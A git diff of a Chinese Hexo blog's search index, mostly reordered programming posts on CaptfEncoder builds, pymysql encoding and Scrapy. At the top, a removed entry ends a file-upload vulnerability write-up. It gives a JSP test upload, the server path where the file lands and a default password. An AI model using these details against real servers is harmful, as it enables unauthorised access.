text/plain</span><br><span class="line">Content-Transfer-Encoding: binary</span><br><span class="line">Content-Id: &lt;1AA0D9D06D1918F13C495E8419BE26EB&gt;</span><br><span class="line"></span><br><span class="line">&lt;%=&quot;hello world!&quot;%&gt;</span><br><span class="line">------=_Part_0_9532399.1399678337692--</span><br></pre></td></tr></table></figure>
-
-<p>上传成功之后，具体落地路径为：<code>jact/main/jact/commonuser/transact/temp/Data/test.jsp</code>其中Data为当前年月，例如：20XXXX</p>
-<h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><p>默认存在某个用户，密码为hanweb。</p>
-<p><img data-src="https://s2.loli.net/2023/04/06/jmcwoWMYTx54lyk.png" alt="hanweb-decode"></p>
-]]></content>
-      <categories>
-        <category>安全</category>
-        <category>漏洞分析</category>
-      </categories>
-      <tags>
-        <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>搭建博客</title>
     <url>/archives/5c83b0d3.html</url>
     <content><![CDATA[<p>　第一次搭建博客，一开始选用GitHub Page + jekyll 从网上找了许多模板，也自己去尝试写，发现总是不如人意。后来，改用GitHub Page + Hexo,套用Next主题满足了折腾的”愿望”。</p>
@@ -1926,6 +1925,34 @@
       <tags>
         <tag>AWIScan</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>CaptfEncoder编译</title>
+    <url>/archives/80d64a8d.html</url>
+    <content><![CDATA[<p>解决CaptfEncoder无法在MacOS上运行。<br><img data-src="https://s2.loli.net/2023/07/11/Sbd7FWLkODvZjU5.jpg"></p>
+<span id="more"></span>
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>直接从GitHub下载下来的CaptfEncoder在MacOS M系列芯片上无法正常运行。根据issues提示是缺少GMP Library。通过brew安装之后，还是无法直接运行。</p>
+<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>gmp</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://s2.loli.net/2023/07/11/ED4mHRchN9J6uWn.jpg"><br>通过find命令查找libgmp.10.dylib将其复制到对应目录</p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">sudo <span class="keyword">find</span> / -name <span class="string">&quot;libgmp.10.dylib&quot;</span></span><br><span class="line">cp <span class="regexp">/System/</span>Volumes<span class="regexp">/Data/</span>opt<span class="regexp">/homebrew/</span>Cellar<span class="regexp">/gmp/</span><span class="number">6.2</span>.<span class="number">1</span>_1<span class="regexp">/lib/</span>libgmp.<span class="number">10</span>.dylib <span class="regexp">/usr/</span>local<span class="regexp">/opt/gm</span>p<span class="regexp">/lib/</span>libgmp.<span class="number">10</span>.dylib</span><br></pre></td></tr></table></figure>
+<p>这时候提示变为<code>mach-o file, but is an incompatible architecture (have &#39;arm64&#39;, need &#39;x86_64&#39;)</code><br><img data-src="https://s2.loli.net/2023/07/11/1v5MLwYq2dVyIo8.jpg"></p>
+<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>下载源码，进入对应目录使用使用cargo运行提示报错</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/guyoung/</span>CaptfEncoder.git</span><br><span class="line">cd CaptfEncoder/CaptfEncoder-V3</span><br><span class="line">cargo run</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://s2.loli.net/2023/07/11/FjYEaohqJ9OzfWX.jpg"><br>根据提示可以知道还是缺少gmp库导致的，根据猜测应该是对应的依赖没被找到。<br>将brew对应的lib加入到环境变量中<code>export LIBRARY_PATH=/opt/homebrew/lib</code>，再运行即可完美解决。<br><img data-src="https://s2.loli.net/2023/07/11/FoEU4hH763RqapT.jpg"></p>
+<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>CaptfEncoder本身已经做了编译的配置，只需要调整Cargo.toml内容即可：</p>
+<ol>
+<li>package中添加description</li>
+<li>icon中修改为app.ico<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;captfencoder&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;3.3.0&quot;</span></span><br><span class="line"><span class="attr">authors</span> = [<span class="string">&quot;guyoung&quot;</span>]</span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2021&quot;</span></span><br><span class="line"><span class="attr">build</span> = <span class="string">&quot;build.rs&quot;</span></span><br><span class="line"><span class="attr">description</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">fltk</span> = <span class="string">&quot;1.4&quot;</span></span><br><span class="line"><span class="attr">fltk-theme</span> = <span class="string">&quot;0.7&quot;</span></span><br><span class="line"><span class="attr">rhai</span> = <span class="string">&quot;1.15&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">tokio</span> = &#123; version = <span class="string">&quot;1&quot;</span>, features = [<span class="string">&quot;full&quot;</span>] &#125;</span><br><span class="line"><span class="attr">reqwest</span> = &#123; version = <span class="string">&quot;0.11&quot;</span>, features = [<span class="string">&quot;json&quot;</span>] &#125;</span><br><span class="line"><span class="attr">serde</span> = <span class="string">&quot;1.0&quot;</span></span><br><span class="line"><span class="attr">serde_json</span> = <span class="string">&quot;1.0&quot;</span></span><br><span class="line"><span class="attr">pollster</span> = <span class="string">&quot;0.2&quot;</span></span><br><span class="line"><span class="attr">base64</span> = <span class="string">&quot;0.13&quot;</span></span><br><span class="line"><span class="attr">anyhow</span> = <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="attr">image</span> = <span class="string">&quot;0.23&quot;</span></span><br><span class="line"><span class="attr">clipboard</span> = <span class="string">&quot;0.5&quot;</span></span><br><span class="line"><span class="attr">rust-embed</span> = <span class="string">&quot;6.3&quot;</span></span><br><span class="line"><span class="attr">webbrowser</span> = <span class="string">&quot;0.5&quot;</span></span><br><span class="line"><span class="attr">rand</span> = <span class="string">&quot;0.8&quot;</span></span><br><span class="line"><span class="attr">dyn-clone</span> = <span class="string">&quot;1.0&quot;</span></span><br><span class="line"><span class="attr">sysinfo</span> = <span class="string">&quot;0.29&quot;</span></span><br><span class="line"><span class="attr">chrono</span> = <span class="string">&quot;0.4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">captfencoder_encoding</span> = &#123; version = <span class="string">&quot;1.0.0&quot;</span>, path = <span class="string">&quot;../encoding&quot;</span>&#125;</span><br><span class="line"><span class="attr">captfencoder_query</span> = &#123; version = <span class="string">&quot;1.0.0&quot;</span>, path = <span class="string">&quot;../query&quot;</span>&#125;</span><br><span class="line"><span class="attr">captfencoder_misc</span> = &#123; version = <span class="string">&quot;1.0.0&quot;</span>, path = <span class="string">&quot;../misc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">lazy_static</span> = <span class="string">&quot;1.4&quot;</span></span><br><span class="line"><span class="attr">state</span> = <span class="string">&quot;0.5&quot;</span></span><br><span class="line"><span class="attr">enum-ordinalize</span> = <span class="string">&quot;3.1&quot;</span></span><br><span class="line"><span class="attr">sublime_fuzzy</span> = <span class="string">&quot;0.7&quot;</span></span><br><span class="line"><span class="attr">crossbeam-channel</span> = <span class="string">&quot;0.5&quot;</span></span><br><span class="line"><span class="attr">event-emitter-rs</span> = <span class="string">&quot;0.1&quot;</span></span><br><span class="line"><span class="attr">hey_listen</span> = <span class="string">&quot;0.5&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">num</span> = <span class="string">&quot;0.4&quot;</span></span><br><span class="line"><span class="attr">num-bigint</span> = <span class="string">&quot;0.4&quot;</span></span><br><span class="line"><span class="attr">num-traits</span> = <span class="string">&quot;0.2&quot;</span></span><br><span class="line"><span class="attr">primal</span> = <span class="string">&quot;0.3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[build-dependencies]</span></span><br><span class="line"><span class="attr">winresource</span> = <span class="string">&quot;0.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[package.metadata.winresource]</span></span><br><span class="line"><span class="attr">ProductName</span> = <span class="string">&quot;CaptfEncoder&quot;</span></span><br><span class="line"><span class="attr">ProductVersion</span> = <span class="string">&quot;3.3.0&quot;</span></span><br><span class="line"><span class="attr">OriginalFilename</span> = <span class="string">&quot;CaptfEncoder.exe&quot;</span></span><br><span class="line"><span class="attr">LegalCopyright</span> = <span class="string">&quot;Copyright © Guyoung studio 2022&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">[package.metadata.bundle]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;CaptfEncoder&quot;</span></span><br><span class="line"><span class="attr">identifier</span> = <span class="string">&quot;net.guyoung.captfencoder&quot;</span></span><br><span class="line"><span class="attr">icon</span> = [<span class="string">&quot;app.ico&quot;</span>]</span><br><span class="line"><span class="comment">#deb_depends = []</span></span><br><span class="line"><span class="attr">osx_minimum_system_version</span> = <span class="string">&quot;10.0&quot;</span></span><br></pre></td></tr></table></figure>
+之后通过<code>cargo bundle</code>编译即可<br><img data-src="https://s2.loli.net/2023/07/11/BpsQiOrxJSZm7wc.jpg"></li>
+</ol>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ol>
+<li>使用cargo时遇到无法通过更新、下载的问题，通过添加CARGO_HTTP_MULTIPLEXING即可解决（多线程下载）<code>CARGO_HTTP_MULTIPLEXING=false cargo update</code><br><img data-src="https://s2.loli.net/2023/07/11/neb76YpPADI5LFy.jpg"></li>
+<li>需要在zshrc在添加<code>export LIBRARY_PATH=/opt/homebrew/lib</code>避免之后又遇到找不到lib的情况</li>
+</ol>
+]]></content>
+      <categories>
+        <category>瞎折腾</category>
+      </categories>
   </entry>
   <entry>
     <title>BurpSuitePro 2.1及之后版本通杀加载器</title>
@@ -2090,22 +2117,6 @@
       </tags>
   </entry>
   <entry>
-    <title>python3 pip缺失VC++</title>
-    <url>/archives/f62064af.html</url>
-    <content><![CDATA[<p>最近使用python3的pip安装scrapy、mysql-python等库出错，需要安装Microsoft Visual C++。网上资料大部分通过源码方式解决，不能一劳永逸解决。这里我从根源解决。<br><img data-src="https://i.loli.net/2018/05/23/5b0549c166495.png" alt="success.png"></p>
-<span id="more"></span>
-<h1 id="VC-缺失"><a href="#VC-缺失" class="headerlink" title="VC++缺失"></a>VC++缺失</h1><p>使用<code>pip install scrapy</code>安装scrapy出现缺失VC++。<br><img data-src="https://i.loli.net/2018/05/23/5b054a41e5f7d.png" alt="pip install scrapy.png"><br>根据报错信息打开<span class="exturl" data-url="aHR0cDovL2xhbmRpbmdodWIudmlzdWFsc3R1ZGlvLmNvbS92aXN1YWwtY3BwLWJ1aWxkLXRvb2xz">VC Build Tools站点<i class="fa fa-external-link-alt"></i></span><br><img data-src="https://i.loli.net/2018/05/23/5b054a8bcc27d.png" alt="web vc.png"><br>点击红框中的链接，找到Visual Studio 2017 生成工具下载对应文件。<br><img data-src="https://i.loli.net/2018/05/23/5b054ac26425e.png" alt="vc build.png"><br>打开下载下来的vs_buildtools程序，勾选Visual C++生成工具，进行安装。<br><img data-src="https://i.loli.net/2018/05/23/5b054b2ecdc28.png" alt="VC++.png"><br>接下来安静等待安装完成。<br><img data-src="https://i.loli.net/2018/05/23/5b054b5ccd253.png" alt="SDK install.png"><br><img data-src="https://i.loli.net/2018/05/23/5b054b5d01b22.png" alt="install success.png"><br>安装完成之后，再使用<code>pip install scrapy</code>即可成功安装。<br><img data-src="https://i.loli.net/2018/05/23/5b0549c166495.png" alt="success.png"></p>
-]]></content>
-      <categories>
-        <category>Code</category>
-        <category>Python3</category>
-      </categories>
-      <tags>
-        <tag>Code</tag>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>漏洞环境搭建</title>
     <url>/archives/583f4516.html</url>
     <content><![CDATA[<p>　在进行安全测试的时候，经常需要搭建各种各样、不同配置的漏洞环境。有时候一天不到就能搞定，有时候两三天都没成功。后来发现一个神器:Docer，结合GitHub上面的漏洞靶场可以通过几条命令就能成功”搭建”一个漏洞环境。</p>
@@ -2173,6 +2184,37 @@
       </tags>
   </entry>
   <entry>
+    <title>Python2-Pymysql中文写入</title>
+    <url>/archives/40673788.html</url>
+    <content><![CDATA[<p>python27的编码是一大难点，然而这次的难点并不是在于python，而在于数据库。</p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在使用Pymysql向mysql数据库写入中文时，发现出现Warning:(1366, u”Incorrect string value: ‘\x······”)<br><img data-src="https://i.loli.net/2018/01/11/5a571e468a843.png" alt="pymysql_warning.png"><br>数据库里面的结果为乱码<br><img data-src="https://i.loli.net/2018/01/11/5a571e444864a.png" alt="database_result.png"></p>
+<h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>看到中文乱码，马上就想到编码问题。该问题共涉及到三处编码（有可能还多，想不出来了）：数据库编码、数据来源编码、脚本连接编码。由于数据来源编码能肯定为Unicode，因此需要从脚本连接编码、数据库编码去解决。</p>
+<h1 id="解决历程"><a href="#解决历程" class="headerlink" title="解决历程"></a>解决历程</h1><h2 id="脚本连接编码"><a href="#脚本连接编码" class="headerlink" title="脚本连接编码"></a>脚本连接编码</h2><p>由于pymysql支持charset字段，下意识想到通过charset参数进行设置。</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import pymysql<span class="selector-class">.cursors</span></span><br><span class="line"> </span><br><span class="line">config = &#123;</span><br><span class="line">          <span class="string">&#x27;host&#x27;</span>:<span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;port&#x27;</span>:<span class="number">3306</span>,</span><br><span class="line">          <span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;db&#x27;</span>:<span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;charset&#x27;</span>:<span class="string">&#x27;utf8mb4&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;cursorclass&#x27;</span>:pymysql<span class="selector-class">.cursors</span><span class="selector-class">.DictCursor</span>,</span><br><span class="line">          &#125;</span><br><span class="line">connection = pymysql<span class="selector-class">.connect</span>(**config)</span><br></pre></td></tr></table></figure>
+<p>然后重新运行脚本，发现并没有解决。</p>
+<h2 id="数据库编码"><a href="#数据库编码" class="headerlink" title="数据库编码"></a>数据库编码</h2><p>查看数据库编码，发现数据库默认编码为latin1。</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">show <span class="keyword">variables</span> like <span class="comment">&quot;char%&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://i.loli.net/2018/01/11/5a571f33ca7f4.png" alt="mysql_charset.png"><br>找到问题所在就方便了！修改database编码即可。<br>由于我使用的是debian，需要修改&#x2F;etc&#x2F;mysql&#x2F;my.cnf文件。</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/my</span>sql/my.cnf</span><br></pre></td></tr></table></figure>
+<p>在[mysqld]字段下面添加character-set-server&#x3D;utf8，保存并重启mysql服务即可。<br><img data-src="https://i.loli.net/2018/01/11/5a5720f7adad4.png" alt="my_cnf_set.png"><br>重新查询数据库编码。<br><img data-src="https://i.loli.net/2018/01/11/5a572256e9607.png" alt="database_charset.png"><br>美滋滋的运行代码，发现还是Warning！！！</p>
+<h2 id="最终解决"><a href="#最终解决" class="headerlink" title="最终解决"></a>最终解决</h2><p>在修改了数据库编码以为脚本可以成功运行的时候，现实跟我说too young！后面兜兜转转，发现重新建立数据库即可！</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li>Python27遇到中文的时候，需要特别注意编码；</li>
+<li>Python进行数据交互的时候，每个地方的编码都需要注意；</li>
+<li>配置修改之后，一定要刷新或者新建！！！</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Code</category>
+        <category>Python2</category>
+      </categories>
+      <tags>
+        <tag>Python2</tag>
+        <tag>编码</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python2-Oracle爆破</title>
     <url>/archives/209eed3d.html</url>
     <content><![CDATA[<p>做渗透的时候遇到Oracle端口对外开放，用python编写脚本去自动爆破，爆破成功就是拿下数据库。</p>
@@ -2208,37 +2250,6 @@
       <tags>
         <tag>Python2</tag>
         <tag>爆破</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python2-Pymysql中文写入</title>
-    <url>/archives/40673788.html</url>
-    <content><![CDATA[<p>python27的编码是一大难点，然而这次的难点并不是在于python，而在于数据库。</p>
-<span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在使用Pymysql向mysql数据库写入中文时，发现出现Warning:(1366, u”Incorrect string value: ‘\x······”)<br><img data-src="https://i.loli.net/2018/01/11/5a571e468a843.png" alt="pymysql_warning.png"><br>数据库里面的结果为乱码<br><img data-src="https://i.loli.net/2018/01/11/5a571e444864a.png" alt="database_result.png"></p>
-<h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>看到中文乱码，马上就想到编码问题。该问题共涉及到三处编码（有可能还多，想不出来了）：数据库编码、数据来源编码、脚本连接编码。由于数据来源编码能肯定为Unicode，因此需要从脚本连接编码、数据库编码去解决。</p>
-<h1 id="解决历程"><a href="#解决历程" class="headerlink" title="解决历程"></a>解决历程</h1><h2 id="脚本连接编码"><a href="#脚本连接编码" class="headerlink" title="脚本连接编码"></a>脚本连接编码</h2><p>由于pymysql支持charset字段，下意识想到通过charset参数进行设置。</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import pymysql<span class="selector-class">.cursors</span></span><br><span class="line"> </span><br><span class="line">config = &#123;</span><br><span class="line">          <span class="string">&#x27;host&#x27;</span>:<span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;port&#x27;</span>:<span class="number">3306</span>,</span><br><span class="line">          <span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;db&#x27;</span>:<span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;charset&#x27;</span>:<span class="string">&#x27;utf8mb4&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;cursorclass&#x27;</span>:pymysql<span class="selector-class">.cursors</span><span class="selector-class">.DictCursor</span>,</span><br><span class="line">          &#125;</span><br><span class="line">connection = pymysql<span class="selector-class">.connect</span>(**config)</span><br></pre></td></tr></table></figure>
-<p>然后重新运行脚本，发现并没有解决。</p>
-<h2 id="数据库编码"><a href="#数据库编码" class="headerlink" title="数据库编码"></a>数据库编码</h2><p>查看数据库编码，发现数据库默认编码为latin1。</p>
-<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">show <span class="keyword">variables</span> like <span class="comment">&quot;char%&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p><img data-src="https://i.loli.net/2018/01/11/5a571f33ca7f4.png" alt="mysql_charset.png"><br>找到问题所在就方便了！修改database编码即可。<br>由于我使用的是debian，需要修改&#x2F;etc&#x2F;mysql&#x2F;my.cnf文件。</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/my</span>sql/my.cnf</span><br></pre></td></tr></table></figure>
-<p>在[mysqld]字段下面添加character-set-server&#x3D;utf8，保存并重启mysql服务即可。<br><img data-src="https://i.loli.net/2018/01/11/5a5720f7adad4.png" alt="my_cnf_set.png"><br>重新查询数据库编码。<br><img data-src="https://i.loli.net/2018/01/11/5a572256e9607.png" alt="database_charset.png"><br>美滋滋的运行代码，发现还是Warning！！！</p>
-<h2 id="最终解决"><a href="#最终解决" class="headerlink" title="最终解决"></a>最终解决</h2><p>在修改了数据库编码以为脚本可以成功运行的时候，现实跟我说too young！后面兜兜转转，发现重新建立数据库即可！</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
-<li>Python27遇到中文的时候，需要特别注意编码；</li>
-<li>Python进行数据交互的时候，每个地方的编码都需要注意；</li>
-<li>配置修改之后，一定要刷新或者新建！！！</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Code</category>
-        <category>Python2</category>
-      </categories>
-      <tags>
-        <tag>Python2</tag>
-        <tag>编码</tag>
       </tags>
   </entry>
   <entry>
@@ -2342,31 +2353,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python2-Scrapy学习(二)</title>
-    <url>/archives/2ba6ae11.html</url>
-    <content><![CDATA[<p>继续学习scrapy,这次学习如何进行数据爬取。<br><img data-src="https://i.loli.net/2018/08/28/5b84f81f600a4.png" alt="scrapy -o result.json.png"></p>
-<span id="more"></span>
-<p>在<a href="/archives/84973573.html" title="Python2-Scrapy学习(一)">Python2-Scrapy学习(一)</a>大致了解了scrapy的基础使用方式，接下来开始使用scrapy结合xpath爬取所需的信息。</p>
-<h1 id="freebuf资讯爬取"><a href="#freebuf资讯爬取" class="headerlink" title="freebuf资讯爬取"></a>freebuf资讯爬取</h1><p>假定需要爬取的是freebuf最新的资讯，通过Chrome的Elements可以看到资讯的信息在<code>class=news_inner news-list</code>的div中。<br><a href="https://i.loli.net/2018/08/28/5b84f1db7b7de.png"><img data-src="https://i.loli.net/2018/08/28/5b84f1db7b7de.png" alt="freebuf div.png"></a><br>使用scrapy shell命令进行调试。</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">scrapy</span> shell -s USER_AGENT=&#x27;Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_13_6) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">68</span>.<span class="number">0</span>.<span class="number">3440</span>.<span class="number">106</span> Safari/<span class="number">537</span>.<span class="number">36</span>&#x27; &#x27;http://www.freebuf.com</span><br></pre></td></tr></table></figure>
-<p><a href="https://i.loli.net/2018/08/28/5b84f2795f37e.png"><img data-src="https://i.loli.net/2018/08/28/5b84f2795f37e.png" alt="scrapy shell debug.png"></a><br>使用<span class="exturl" data-url="aHR0cHM6Ly93d3cudzMub3JnL1RSL3hwYXRoL2FsbC8=">xpath<i class="fa fa-external-link-alt"></i></span>选择器来筛选需要的数据。<br><a href="https://i.loli.net/2018/08/28/5b84f42788808.png"><img data-src="https://i.loli.net/2018/08/28/5b84f42788808.png" alt="scrapy shell get.png"></a><br>最后使用<code>scrapy crawl freebufSprider -o result.json</code>可将结果保存至result.json中。<br><a href="https://i.loli.net/2018/08/28/5b84f81f600a4.png"><img data-src="https://i.loli.net/2018/08/28/5b84f81f600a4.png" alt="scrapy -o result.json.png"></a></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
-<li>爬虫的步骤：访问站点、解析数据、获取数据。</li>
-<li>scrapy支出css、xpath，大家看哪个顺手就用那个好了。</li>
-</ol>
-<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>完整代码已经上传到GitHub。如果有兴趣，不妨移步到Github上一观！**<a href="https://github.com/HyWell/Python/tree/master/Crawler/freebuf"><font color=blue>Code</font></a>**。</p>
-]]></content>
-      <categories>
-        <category>Code</category>
-        <category>Python2</category>
-      </categories>
-      <tags>
-        <tag>Python2</tag>
-        <tag>scrapy</tag>
-        <tag>爬虫</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python2-Scrapy学习(一)</title>
     <url>/archives/84973573.html</url>
     <content><![CDATA[<p>以前写爬虫都是自己使用requests、bs4等库手工编写，最近想学学scrapy看看这个爬虫神器有多强大。<br>[<img data-src="https://i.loli.net/2018/08/24/5b7fc660b4c28.png" alt="scrapy crawl.png"></p>
@@ -2396,6 +2382,31 @@
 <li>单个脚本的scrapy提供了导出等API接口，相对自己写的更方便。</li>
 </ol>
 <p> </p>
+]]></content>
+      <categories>
+        <category>Code</category>
+        <category>Python2</category>
+      </categories>
+      <tags>
+        <tag>Python2</tag>
+        <tag>scrapy</tag>
+        <tag>爬虫</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python2-Scrapy学习(二)</title>
+    <url>/archives/2ba6ae11.html</url>
+    <content><![CDATA[<p>继续学习scrapy,这次学习如何进行数据爬取。<br><img data-src="https://i.loli.net/2018/08/28/5b84f81f600a4.png" alt="scrapy -o result.json.png"></p>
+<span id="more"></span>
+<p>在<a href="/archives/84973573.html" title="Python2-Scrapy学习(一)">Python2-Scrapy学习(一)</a>大致了解了scrapy的基础使用方式，接下来开始使用scrapy结合xpath爬取所需的信息。</p>
+<h1 id="freebuf资讯爬取"><a href="#freebuf资讯爬取" class="headerlink" title="freebuf资讯爬取"></a>freebuf资讯爬取</h1><p>假定需要爬取的是freebuf最新的资讯，通过Chrome的Elements可以看到资讯的信息在<code>class=news_inner news-list</code>的div中。<br><a href="https://i.loli.net/2018/08/28/5b84f1db7b7de.png"><img data-src="https://i.loli.net/2018/08/28/5b84f1db7b7de.png" alt="freebuf div.png"></a><br>使用scrapy shell命令进行调试。</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">scrapy</span> shell -s USER_AGENT=&#x27;Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_13_6) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">68</span>.<span class="number">0</span>.<span class="number">3440</span>.<span class="number">106</span> Safari/<span class="number">537</span>.<span class="number">36</span>&#x27; &#x27;http://www.freebuf.com</span><br></pre></td></tr></table></figure>
+<p><a href="https://i.loli.net/2018/08/28/5b84f2795f37e.png"><img data-src="https://i.loli.net/2018/08/28/5b84f2795f37e.png" alt="scrapy shell debug.png"></a><br>使用<span class="exturl" data-url="aHR0cHM6Ly93d3cudzMub3JnL1RSL3hwYXRoL2FsbC8=">xpath<i class="fa fa-external-link-alt"></i></span>选择器来筛选需要的数据。<br><a href="https://i.loli.net/2018/08/28/5b84f42788808.png"><img data-src="https://i.loli.net/2018/08/28/5b84f42788808.png" alt="scrapy shell get.png"></a><br>最后使用<code>scrapy crawl freebufSprider -o result.json</code>可将结果保存至result.json中。<br><a href="https://i.loli.net/2018/08/28/5b84f81f600a4.png"><img data-src="https://i.loli.net/2018/08/28/5b84f81f600a4.png" alt="scrapy -o result.json.png"></a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li>爬虫的步骤：访问站点、解析数据、获取数据。</li>
+<li>scrapy支出css、xpath，大家看哪个顺手就用那个好了。</li>
+</ol>
+<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>完整代码已经上传到GitHub。如果有兴趣，不妨移步到Github上一观！**<a href="https://github.com/HyWell/Python/tree/master/Crawler/freebuf"><font color=blue>Code</font></a>**。</p>
 ]]></content>
       <categories>
         <category>Code</category>
@@ -2552,6 +2563,22 @@
       <tags>
         <tag>Python2</tag>
         <tag>爬虫</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python3 pip缺失VC++</title>
+    <url>/archives/f62064af.html</url>
+    <content><![CDATA[<p>最近使用python3的pip安装scrapy、mysql-python等库出错，需要安装Microsoft Visual C++。网上资料大部分通过源码方式解决，不能一劳永逸解决。这里我从根源解决。<br><img data-src="https://i.loli.net/2018/05/23/5b0549c166495.png" alt="success.png"></p>
+<span id="more"></span>
+<h1 id="VC-缺失"><a href="#VC-缺失" class="headerlink" title="VC++缺失"></a>VC++缺失</h1><p>使用<code>pip install scrapy</code>安装scrapy出现缺失VC++。<br><img data-src="https://i.loli.net/2018/05/23/5b054a41e5f7d.png" alt="pip install scrapy.png"><br>根据报错信息打开<span class="exturl" data-url="aHR0cDovL2xhbmRpbmdodWIudmlzdWFsc3R1ZGlvLmNvbS92aXN1YWwtY3BwLWJ1aWxkLXRvb2xz">VC Build Tools站点<i class="fa fa-external-link-alt"></i></span><br><img data-src="https://i.loli.net/2018/05/23/5b054a8bcc27d.png" alt="web vc.png"><br>点击红框中的链接，找到Visual Studio 2017 生成工具下载对应文件。<br><img data-src="https://i.loli.net/2018/05/23/5b054ac26425e.png" alt="vc build.png"><br>打开下载下来的vs_buildtools程序，勾选Visual C++生成工具，进行安装。<br><img data-src="https://i.loli.net/2018/05/23/5b054b2ecdc28.png" alt="VC++.png"><br>接下来安静等待安装完成。<br><img data-src="https://i.loli.net/2018/05/23/5b054b5ccd253.png" alt="SDK install.png"><br><img data-src="https://i.loli.net/2018/05/23/5b054b5d01b22.png" alt="install success.png"><br>安装完成之后，再使用<code>pip install scrapy</code>即可成功安装。<br><img data-src="https://i.loli.net/2018/05/23/5b0549c166495.png" alt="success.png"></p>
+]]></content>
+      <categories>
+        <category>Code</category>
+        <category>Python3</category>
+      </categories>
+      <tags>
+        <tag>Code</tag>
+        <tag>Python3</tag>
       </tags>
   </entry>
 </search>
